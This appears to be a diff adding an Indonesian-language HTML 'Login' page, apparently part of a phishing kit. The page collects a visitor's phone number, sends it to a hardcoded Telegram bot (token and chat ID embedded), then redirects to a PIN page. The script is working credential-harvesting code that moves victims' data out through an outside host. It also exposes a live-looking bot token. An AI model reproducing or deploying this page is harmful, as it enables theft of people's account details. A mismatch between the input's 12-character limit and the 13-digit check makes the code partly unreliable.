@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Input Nomor HP</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+            background-color: #f2f2f2;
+        }
+
+        .background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 56.25vw; /* 16:9 aspect ratio */
+            max-height: 100vh;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        .container {
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.8); /* Latar belakang transparan */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            z-index: 1; /* Atas lapisan gambar */
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #responseMessage {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <img class="background-image" src="url_to_your_image.jpg" alt="Background Image">
+    
+    <div class="container">
+        <h2>Masukkan Nomor HP</h2>
+        <input type="text" id="phoneInput" placeholder="Masukkan Nomor Handphone" maxlength="12">
+        <button onclick="kirimNomorHP()">Login</button>
+        <div id="responseMessage"></div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script>
+        function kirimNomorHP() {
+            const phoneInput = $('#phoneInput').val();
+            const urlPindah = 'pin.html'; // Ganti dengan nama file dan ekstensi yang sesuai
+            const telegramApiKey = '6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0'; // Ganti dengan API Key bot Telegram Anda
+            const chatId = '6824078885'; // Ganti dengan ID obrolan atau pengguna di Telegram
+
+            if (/^\d{13}$/.test(phoneInput)) {
+                $.ajax({
+                    type: 'POST',
+                    url: 'URL_AJAX_PHONE',
+                    data: { phone: phoneInput },
+                    dataType: 'json',
+                    success: function(response) {
+                        $('#responseMessage').text(response.message);
+
+                        if (response.success) {
+                            // Kirim pesan ke Telegram Bot
+                            kirimPesanTelegram(`Nomor HP berhasil diverifikasi: ${phoneInput}`, telegramApiKey, chatId);
+
+                            // Pindah ke halaman pin.html
+                            window.location.href = urlPindah;
+                        }
+                    },
+                    error: function(error) {
+                        console.error(error);
+                        $('#responseMessage').text('Terjadi kesalahan.');
+                    }
+                });
+            } else {
+                $('#responseMessage').text('Nomor HP harus terdiri dari 13 digit angka.');
+            }
+        }
+
+        function kirimPesanTelegram(message, apiKey, chatId) {
+            $.ajax({
+                type: 'GET',
+                url: `https://api.telegram.org/bot${apiKey}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: message
+                },
+                success: function(response) {
+                    console.log('Pesan berhasil dikirim ke Telegram');
+                },
+                error: function(error) {
+                    console.error('Gagal mengirim pesan ke Telegram:', error);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
